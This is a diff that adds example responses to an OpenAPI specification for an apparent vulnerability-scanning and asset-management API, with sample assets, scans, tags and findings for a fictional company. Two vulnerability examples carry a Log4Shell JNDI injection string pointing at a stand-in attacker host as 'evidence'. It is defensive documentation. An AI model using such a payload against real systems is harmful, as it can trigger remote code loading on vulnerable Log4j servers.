@@ -97,6 +97,42 @@ paths:
                         type: array
                         items:
                           $ref: '#/components/schemas/Asset'
+              example:
+                meta:
+                  total: 142
+                  page: 1
+                  per_page: 25
+                data:
+                  - id: ast_1a2b3c4d5e6f0001
+                    type: subdomain
+                    value: api.acmecorp.com
+                    status: active
+                    first_seen_at: '2024-01-15T08:30:00Z'
+                    last_seen_at: '2024-06-05T14:22:00Z'
+                    tags:
+                      - id: tag_0001aabbccdd0001
+                        name: production
+                        color: '#2a9d8f'
+                        created_at: '2024-01-10T00:00:00Z'
+                    open_vulnerability_counts:
+                      critical: 0
+                      high: 2
+                      medium: 5
+                      low: 8
+                      informational: 3
+                  - id: ast_2b3c4d5e6f7a0002
+                    type: ip
+                    value: 203.0.113.42
+                    status: active
+                    first_seen_at: '2024-02-01T12:00:00Z'
+                    last_seen_at: '2024-06-05T14:22:00Z'
+                    tags: []
+                    open_vulnerability_counts:
+                      critical: 1
+                      high: 0
+                      medium: 2
+                      low: 1
+                      informational: 0
         '401':
           $ref: '#/components/responses/Unauthorized'
         '429':
@@ -117,6 +153,41 @@ paths:
             application/json:
               schema:
                 $ref: '#/components/schemas/AssetDetail'
+              example:
+                id: ast_1a2b3c4d5e6f0001
+                type: subdomain
+                value: api.acmecorp.com
+                status: active
+                first_seen_at: '2024-01-15T08:30:00Z'
+                last_seen_at: '2024-06-05T14:22:00Z'
+                tags:
+                  - id: tag_0001aabbccdd0001
+                    name: production
+                    color: '#2a9d8f'
+                    created_at: '2024-01-10T00:00:00Z'
+                open_vulnerability_counts:
+                  critical: 0
+                  high: 2
+                  medium: 5
+                  low: 8
+                  informational: 3
+                owner: platform-team@acmecorp.com
+                notes: Primary public API endpoint. Contact platform-team before archiving.
+                open_ports:
+                  - port: 443
+                    protocol: tcp
+                    service: https
+                    banner: nginx/1.24.0
+                  - port: 80
+                    protocol: tcp
+                    service: http
+                    banner: nginx/1.24.0
+                certificates:
+                  - subject: CN=api.acmecorp.com
+                    issuer: "CN=R3, O=Let's Encrypt, C=US"
+                    not_before: '2024-03-01T00:00:00Z'
+                    not_after: '2024-09-01T00:00:00Z'
+                    expires_in_days: 87
         '401':
           $ref: '#/components/responses/Unauthorized'
         '404':
@@ -139,6 +210,41 @@ paths:
             application/json:
               schema:
                 $ref: '#/components/schemas/AssetDetail'
+              example:
+                id: ast_1a2b3c4d5e6f0001
+                type: subdomain
+                value: api.acmecorp.com
+                status: active
+                first_seen_at: '2024-01-15T08:30:00Z'
+                last_seen_at: '2024-06-05T14:22:00Z'
+                tags:
+                  - id: tag_0001aabbccdd0001
+                    name: production
+                    color: '#2a9d8f'
+                    created_at: '2024-01-10T00:00:00Z'
+                  - id: tag_0002aabbccdd0002
+                    name: dmz
+                    color: '#e63946'
+                    created_at: '2024-02-14T12:00:00Z'
+                open_vulnerability_counts:
+                  critical: 0
+                  high: 2
+                  medium: 5
+                  low: 8
+                  informational: 3
+                owner: platform-team@acmecorp.com
+                notes: Reviewed and tagged for DMZ segment.
+                open_ports:
+                  - port: 443
+                    protocol: tcp
+                    service: https
+                    banner: nginx/1.24.0
+                certificates:
+                  - subject: CN=api.acmecorp.com
+                    issuer: "CN=R3, O=Let's Encrypt, C=US"
+                    not_before: '2024-03-01T00:00:00Z'
+                    not_after: '2024-09-01T00:00:00Z'
+                    expires_in_days: 87
         '400':
           $ref: '#/components/responses/BadRequest'
         '401':
@@ -187,6 +293,31 @@ paths:
                         type: array
                         items:
                           $ref: '#/components/schemas/Scan'
+              example:
+                meta:
+                  total: 18
+                  page: 1
+                  per_page: 25
+                data:
+                  - id: scn_a1b2c3d4e5f60001
+                    label: Weekly full scan
+                    status: completed
+                    scan_type: full
+                    targets:
+                      - acmecorp.com
+                      - 203.0.113.0/24
+                    created_at: '2024-06-05T00:00:00Z'
+                    started_at: '2024-06-05T00:01:12Z'
+                    completed_at: '2024-06-05T01:34:55Z'
+                  - id: scn_b2c3d4e5f6a70002
+                    label: null
+                    status: running
+                    scan_type: vuln_only
+                    targets:
+                      - api.acmecorp.com
+                    created_at: '2024-06-06T09:00:00Z'
+                    started_at: '2024-06-06T09:01:05Z'
+                    completed_at: null
         '401':
           $ref: '#/components/responses/Unauthorized'
     post:
@@ -209,6 +340,16 @@ paths:
             application/json:
               schema:
                 $ref: '#/components/schemas/Scan'
+              example:
+                id: scn_a1b2c3d4e5f60001
+                label: CI pipeline scan
+                status: queued
+                scan_type: full
+                targets:
+                  - staging.acmecorp.com
+                created_at: '2024-06-06T09:15:00Z'
+                started_at: null
+                completed_at: null
         '400':
           $ref: '#/components/responses/BadRequest'
         '401':
@@ -237,6 +378,28 @@ paths:
             application/json:
               schema:
                 $ref: '#/components/schemas/ScanDetail'
+              example:
+                id: scn_a1b2c3d4e5f60001
+                label: Weekly full scan
+                status: completed
+                scan_type: full
+                targets:
+                  - acmecorp.com
+                  - 203.0.113.0/24
+                created_at: '2024-06-05T00:00:00Z'
+                started_at: '2024-06-05T00:01:12Z'
+                completed_at: '2024-06-05T01:34:55Z'
+                summary:
+                  assets_discovered: 34
+                  assets_updated: 12
+                  vulnerabilities_found: 7
+                  vulnerabilities_by_severity:
+                    critical: 0
+                    high: 2
+                    medium: 3
+                    low: 1
+                    informational: 1
+                error_message: null
         '401':
           $ref: '#/components/responses/Unauthorized'
         '404':
@@ -290,6 +453,32 @@ paths:
                         type: array
                         items:
                           $ref: '#/components/schemas/Vulnerability'
+              example:
+                meta:
+                  total: 37
+                  page: 1
+                  per_page: 25
+                data:
+                  - id: vln_x9y8z7w6v5u40001
+                    asset_id: ast_1a2b3c4d5e6f0001
+                    title: Apache Log4j Remote Code Execution (Log4Shell)
+                    severity: critical
+                    status: in_progress
+                    cvss_score: 10.0
+                    cve_ids:
+                      - CVE-2021-44228
+                    first_detected_at: '2024-05-01T10:00:00Z'
+                    last_seen_at: '2024-06-05T14:22:00Z'
+                  - id: vln_y8z7w6v5u4t30002
+                    asset_id: ast_2b3c4d5e6f7a0002
+                    title: OpenSSH Username Enumeration
+                    severity: medium
+                    status: open
+                    cvss_score: 5.3
+                    cve_ids:
+                      - CVE-2018-15473
+                    first_detected_at: '2024-05-15T08:00:00Z'
+                    last_seen_at: '2024-06-05T14:22:00Z'
         '401':
           $ref: '#/components/responses/Unauthorized'
 
@@ -314,6 +503,40 @@ paths:
             application/json:
               schema:
                 $ref: '#/components/schemas/VulnerabilityDetail'
+              example:
+                id: vln_x9y8z7w6v5u40001
+                asset_id: ast_1a2b3c4d5e6f0001
+                title: Apache Log4j Remote Code Execution (Log4Shell)
+                severity: critical
+                status: in_progress
+                cvss_score: 10.0
+                cve_ids:
+                  - CVE-2021-44228
+                first_detected_at: '2024-05-01T10:00:00Z'
+                last_seen_at: '2024-06-05T14:22:00Z'
+                description: >-
+                  A critical unauthenticated RCE vulnerability in Apache Log4j 2.x via
+                  JNDI lookup injection in log messages. Affects versions 2.0-beta9
+                  through 2.14.1.
+                remediation: >-
+                  Upgrade log4j-core to 2.17.1 or later. As an immediate mitigation,
+                  set the JVM flag -Dlog4j2.formatMsgNoLookups=true or remove the
+                  JndiLookup class from the classpath.
+                references:
+                  - 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228'
+                  - 'https://logging.apache.org/log4j/2.x/security.html'
+                affected_component: log4j-core 2.14.1
+                evidence: "HTTP User-Agent: ${jndi:ldap://attacker.example/a} triggered outbound DNS"
+                notes: Escalated to platform team on 2024-05-02. Patch scheduled for next release window.
+                history:
+                  - changed_at: '2024-05-01T10:00:00Z'
+                    changed_by: system
+                    from_status: null
+                    to_status: open
+                  - changed_at: '2024-05-02T09:00:00Z'
+                    changed_by: alice@acmecorp.com
+                    from_status: open
+                    to_status: in_progress
         '401':
           $ref: '#/components/responses/Unauthorized'
         '404':
@@ -336,6 +559,40 @@ paths:
             application/json:
               schema:
                 $ref: '#/components/schemas/VulnerabilityDetail'
+              example:
+                id: vln_x9y8z7w6v5u40001
+                asset_id: ast_1a2b3c4d5e6f0001
+                title: Apache Log4j Remote Code Execution (Log4Shell)
+                severity: critical
+                status: accepted_risk
+                cvss_score: 10.0
+                cve_ids:
+                  - CVE-2021-44228
+                first_detected_at: '2024-05-01T10:00:00Z'
+                last_seen_at: '2024-06-05T14:22:00Z'
+                description: >-
+                  A critical unauthenticated RCE vulnerability in Apache Log4j 2.x via
+                  JNDI lookup injection in log messages.
+                remediation: >-
+                  Upgrade log4j-core to 2.17.1 or later.
+                references:
+                  - 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228'
+                affected_component: log4j-core 2.14.1
+                evidence: "HTTP User-Agent: ${jndi:ldap://attacker.example/a} triggered outbound DNS"
+                notes: Accepted risk — legacy system, network-level controls in place.
+                history:
+                  - changed_at: '2024-05-01T10:00:00Z'
+                    changed_by: system
+                    from_status: null
+                    to_status: open
+                  - changed_at: '2024-05-02T09:00:00Z'
+                    changed_by: alice@acmecorp.com
+                    from_status: open
+                    to_status: in_progress
+                  - changed_at: '2024-06-06T11:00:00Z'
+                    changed_by: alice@acmecorp.com
+                    from_status: in_progress
+                    to_status: accepted_risk
         '400':
           $ref: '#/components/responses/BadRequest'
         '401':
@@ -360,6 +617,20 @@ paths:
                     type: array
                     items:
                       $ref: '#/components/schemas/Tag'
+              example:
+                data:
+                  - id: tag_0001aabbccdd0001
+                    name: production
+                    color: '#2a9d8f'
+                    created_at: '2024-01-10T00:00:00Z'
+                  - id: tag_0002aabbccdd0002
+                    name: dmz
+                    color: '#e63946'
+                    created_at: '2024-02-14T12:00:00Z'
+                  - id: tag_0003aabbccdd0003
+                    name: staging
+                    color: '#f4a261'
+                    created_at: '2024-03-01T09:00:00Z'
         '401':
           $ref: '#/components/responses/Unauthorized'
     post:
@@ -388,6 +659,11 @@ paths:
             application/json:
               schema:
                 $ref: '#/components/schemas/Tag'
+              example:
+                id: tag_0003aabbccdd0003
+                name: staging
+                color: '#f4a261'
+                created_at: '2024-06-06T09:20:00Z'
         '400':
           $ref: '#/components/responses/BadRequest'
         '401':
